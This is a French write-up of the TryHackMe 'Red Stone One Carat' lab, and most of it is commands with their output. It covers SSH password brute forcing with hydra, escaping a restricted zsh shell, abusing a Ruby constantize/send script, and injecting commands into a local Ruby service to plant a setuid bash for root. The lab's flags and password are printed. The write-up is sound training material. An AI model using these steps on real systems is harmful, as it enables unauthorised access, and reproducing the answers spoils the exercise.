# Red Stone One Carat # 

## Task 1 Info Intro ##

## Task 2 Practical Flags ##

**SSH password**

Sur le site tryhackme on nous donne le non d'utilisateur qui est  : noraj
Le mot de passe contient bu.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.118.100 redstone.thm' >> /etc/hosts" 
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ cat /usr/share/wordlists/rockyou.txt | grep -a 'bu' > bu.txt

tim@kali:~/Bureau/tryhackme/write-up$ hydra -l noraj -P bu.txt ssh://redstone.thm
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-25 22:40:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 126339 login tries (l:1/p:126339), ~7897 tries per task
[DATA] attacking ssh://redstone.thm:22/
[STATUS] 178.00 tries/min, 178 tries in 00:01h, 126163 to do in 11:49h, 16 active
[22][ssh] host: redstone.thm   login: noraj   password: cheeseburger
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 6 final worker threads did not complete until end.
[ERROR] 6 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-25 22:41:52

```

On récupère tout les mots de passes qui ont bu.  
On brute force le mot de passe avec hydra.   
On trouve le mot de passe qui est : cheeseburger.   

**user.txt**

```bash
The authenticity of host 'redstone.thm (10.10.118.100)' can't be established.
ECDSA key fingerprint is SHA256:t6GH+aBHvu6sjHajA+1CT0alpHjumGxNp2LdvKb1vWU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'redstone.thm,10.10.118.100' (ECDSA) to the list of known hosts.
noraj@redstone.thm's password: 
getent:6: command not found: grep
compdump:136: command not found: mv
red-stone-one-carat% ls
zsh: command not found: ls
```

On se connecte sur shell limité.  

```bash
red-stone-one-carat% echo $PATH
/home/noraj/bin
red-stone-one-carat% export
HOME=/home/noraj
LANG=en_US.UTF-8
LANGUAGE=en_US:
LOGNAME=noraj
MAIL=/var/mail/noraj
OLDPWD=/home/noraj
PATH=/home/noraj/bin
PWD=/home/noraj
SHELL=/bin/rzsh
SHLVL=1
SSH_CLIENT='10.9.228.66 57668 22'
SSH_CONNECTION='10.9.228.66 57668 10.10.118.100 22'
SSH_TTY=/dev/pts/0
TERM=xterm-256color
USER=noraj
XDG_RUNTIME_DIR=/run/user/1001
XDG_SESSION_ID=6

```

echo et export fonctionne.  

Avec echo on peut faire plusieurs actions : 
echo ./* pour lister les fichiers.   
echo ./.* pour lister les fichiers cachés.  
echo $() pour lire les fichiers.  

```bash
red-stone-one-carat% echo ./*
./bin ./user.txt
red-stone-one-carat% echo $(<./user.txt)
THM{3a106092635945849a0fbf7bac92409d}
```

Dans le répertoire actuel on trouve le fichier user.txt.   
On lit le fichier et on a le flag.   
Le flag est : THM{3a106092635945849a0fbf7bac92409d}    

**root.txt**

```bash
red-stone-one-carat% echo ../../../../../bin/b???    
../../../../../bin/bash
red-stone-one-carat% export SHELL=/bin/bash
export: SHELL: restricted

red-stone-one-carat% echo ./bin/*
./bin/rzsh ./bin/test.rb

red-stone-one-carat% test.rb
#!/usr/bin/ruby

require 'rails'

if ARGV.size == 3
    klass = ARGV[0].constantize
    obj = klass.send(ARGV[1].to_sym, ARGV[2])
else
    puts File.read(__FILE__)
end
```

On essaie de changer la variable SHELL mais c'est impossible.  
On repère un fichier test.rb.  
On l'exécute, on voie le code source du fichier, il y a une instructio constantize qui est là peu être dangereuse.   

```bash
red-stone-one-carat% test.rb Kernel exec '/bin/zsh'
red-stone-one-carat% export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

```
On exécute par test.rb, le shell /bin/zsh.  
On modifie la variable PATH pour indiquer au shell ou se trouve les exécutables.   

```bash
red-stone-one-carat% nc -z -v -n -w 1 127.0.0.1 1-65535
(UNKNOWN) [127.0.0.1] 59308 (?) open
(UNKNOWN) [127.0.0.1] 49332 (?) open
(UNKNOWN) [127.0.0.1] 31547 (?) open
(UNKNOWN) [127.0.0.1] 22 (ssh) open
red-stone-one-carat% nc 127.0.0.1 31547
$ id
undefined local variable or method `id' for main:Object

```

On scan les ports sur le local host.   
On se connecte sur le port 31547.  
On test une commande, ça ne fonctionne pas, il semble que c'est du ruby.  

```bash
$ exec %q!cp /bin/bash /tmp/bash; chmod +s /tmp/bash!
red-stone-one-carat% /tmp/bash -p
bash-4.4# id
uid=1001(noraj) gid=1001(noraj) euid=0(root) egid=0(root) groups=0(root),1001(noraj)
bash-4.4# cat /root/root.txt
THM{58e53d1324eef6265fdb97b08ed9aadf}bash-4.4# 
```

On copie bash dans tmp avec les droits setuid.  
On exécute notre bash. 
On a un shell avec les droits root.   
On lit le flag qui est : THM{58e53d1324eef6265fdb97b08ed9aadf}   
